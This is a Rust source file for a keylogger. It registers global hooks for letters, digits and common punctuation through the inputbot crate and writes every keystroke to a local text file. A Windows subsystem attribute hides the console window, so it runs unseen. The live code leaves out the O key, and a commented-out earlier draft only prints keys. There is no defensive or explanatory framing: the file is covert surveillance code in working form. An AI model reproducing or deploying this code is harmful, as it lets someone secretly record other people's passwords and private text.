#![windows_subsystem = "windows"]

use inputbot::KeybdKey::*;
use std::fs::File;
use std::io::Write;
use std::sync::{Arc, Mutex};

fn main() {

    let file = match File::create("output.txt") {
        Ok(file) => Arc::new(Mutex::new(file)),
        Err(e) => {
            println!("Failed to create file: {}", e);
            return;
        }
    };

    AKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "a").expect("Unable to write to file")
    });
    BKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "b").expect("Unable to write to file")
    });
    CKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "c").expect("Unable to write to file")
    });
    DKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "d").expect("Unable to write to file")
    });
    EKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "e").expect("Unable to write to file")
    });
    FKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "f").expect("Unable to write to file")
    });
    GKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "g").expect("Unable to write to file")
    });
    HKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "h").expect("Unable to write to file")
    });
    IKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "i").expect("Unable to write to file")
    });
    JKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "j").expect("Unable to write to file")
    });
    KKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "k").expect("Unable to write to file")
    });
    LKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "l").expect("Unable to write to file")
    });
    MKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "m").expect("Unable to write to file")
    });
    NKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "n").expect("Unable to write to file")
    });

    PKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "p").expect("Unable to write to file")
    });
    QKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "q").expect("Unable to write to file")
    });
    RKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "r").expect("Unable to write to file")
    });
    SKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "s").expect("Unable to write to file")
    });
    TKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "t").expect("Unable to write to file")
    });
    UKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "u").expect("Unable to write to file")
    });
    VKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "v").expect("Unable to write to file")
    });
    WKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "w").expect("Unable to write to file")
    });
    XKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "x").expect("Unable to write to file")
    });
    YKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "y").expect("Unable to write to file")
    });
    ZKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "z").expect("Unable to write to file")
    });
    SpaceKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), " ").expect("Unable to write to file")
    });
    EnterKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "\n").expect("Unable to write to file")
    });
    CommaKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), ",").expect("Unable to write to file")
    });
    PeriodKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), ".").expect("Unable to write to file")
    });
    SemicolonKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), ";").expect("Unable to write to file")
    });

    SlashKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "/").expect("Unable to write to file")
    });
    BackslashKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "\\").expect("Unable to write to file")
    });
    Numrow1Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "1").expect("Unable to write to file")
    });
    Numrow2Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "2").expect("Unable to write to file")
    });
    Numrow3Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "3").expect("Unable to write to file")
    });
    Numrow4Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "4").expect("Unable to write to file")
    });
    Numrow5Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "5").expect("Unable to write to file")
    });
    Numrow6Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "6").expect("Unable to write to file")
    });
    Numrow7Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "7").expect("Unable to write to file")
    });
    Numrow8Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "8").expect("Unable to write to file")
    });
    Numrow9Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "9").expect("Unable to write to file")
    });
    Numrow0Key.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "0").expect("Unable to write to file")
    });
    MinusKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "-").expect("Unable to write to file")
    });
    EqualKey.bind({
        let file = Arc::clone(&file);
        move || write!(file.lock().unwrap(), "=").expect("Unable to write to file")
    });




    inputbot::handle_input_events();
}



// use inputbot::KeybdKey::*;
//
// fn main() {
//     AKey.bind(|| println!("A"));
//     BKey.bind(|| println!("B"));
//     CKey.bind(|| println!("C"));
//     DKey.bind(|| println!("D"));
//     EKey.bind(|| println!("E"));
//     FKey.bind(|| println!("F"));
//     GKey.bind(|| println!("G"));
//     HKey.bind(|| println!("H"));
//     IKey.bind(|| println!("I"));
//     JKey.bind(|| println!("J"));
//     KKey.bind(|| println!("K"));
//     LKey.bind(|| println!("L"));
//     MKey.bind(|| println!("M"));
//     NKey.bind(|| println!("N"));
//     OKey.bind(|| println!("O"));
//     PKey.bind(|| println!("P"));
//     QKey.bind(|| println!("Q"));
//     RKey.bind(|| println!("R"));
//     SKey.bind(|| println!("S"));
//     TKey.bind(|| println!("T"));
//     UKey.bind(|| println!("U"));
//     VKey.bind(|| println!("V"));
//     WKey.bind(|| println!("W"));
//     XKey.bind(|| println!("X"));
//     YKey.bind(|| println!("Y"));
//     ZKey.bind(|| println!("Z"));
//
//
//     // Bind more keys as needed...
//
//     inputbot::handle_input_events();
//     }
